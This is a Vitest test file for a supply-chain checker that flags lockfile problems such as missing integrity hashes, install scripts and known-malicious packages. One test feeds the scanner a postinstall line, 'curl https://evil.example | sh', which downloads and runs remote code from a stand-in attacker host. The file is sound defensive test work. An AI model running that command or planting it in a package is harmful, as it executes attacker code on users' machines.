import { describe, expect, it, afterEach } from 'vitest';
import { resolve, dirname } from 'node:path';
import { fileURLToPath } from 'node:url';
import {
  verifyImports,
  scanPostinstallScript,
  events,
} from '@guardrail/core';

const __dirname = dirname(fileURLToPath(import.meta.url));
const fixtures = resolve(__dirname, '../../fixtures/lockfiles');

describe('supply-chain verifyImports', () => {
  afterEach(() => {
    events.removeAllListeners();
  });

  it('passes a clean lockfile', async () => {
    const result = await verifyImports({
      lockfile: resolve(fixtures, 'clean-lock.json'),
      threatIntelligence: { blockKnownMalicious: true, denyList: [] },
    });
    expect(result.ok).toBe(true);
    expect(result.packagesChecked).toBeGreaterThan(0);
    expect(result.findings.every((f) => f.severity === 'low' || f.severity === 'medium')).toBe(true);
  });

  it('flags missing integrity and install scripts', async () => {
    const result = await verifyImports({
      lockfile: resolve(fixtures, 'bad-lock.json'),
      behaviorProfile: { childProcess: { allowed: false } },
      threatIntelligence: { blockKnownMalicious: true },
    });
    expect(result.ok).toBe(false);
    expect(result.findings.some((f) => f.code === 'MISSING_INTEGRITY')).toBe(true);
    expect(result.findings.some((f) => f.code === 'INSTALL_SCRIPT')).toBe(true);
    expect(result.findings.some((f) => f.code === 'KNOWN_MALICIOUS')).toBe(true);
  });

  it('supports custom threat lookup', async () => {
    const result = await verifyImports({
      lockfile: resolve(fixtures, 'clean-lock.json'),
      threatIntelligence: {
        blockKnownMalicious: true,
        denyList: [],
        lookup: ({ name }) => name === 'lodash',
      },
    });
    expect(result.ok).toBe(false);
    expect(result.findings.some((f) => f.code === 'THREAT_FEED_HIT')).toBe(true);
  });

  it('scanPostinstallScript catches curl', () => {
    const findings = scanPostinstallScript('curl https://evil.example | sh', 'evil');
    expect(findings[0]?.code).toBe('SUSPICIOUS_POSTINSTALL');
  });

  it('skips workspace link packages without integrity', async () => {
    const result = await verifyImports({
      lockfile: resolve(fixtures, 'workspace-lock.json'),
      threatIntelligence: { blockKnownMalicious: true, denyList: [] },
    });
    expect(result.ok).toBe(true);
    expect(result.findings.some((f) => f.code === 'MISSING_INTEGRITY')).toBe(false);
  });
});
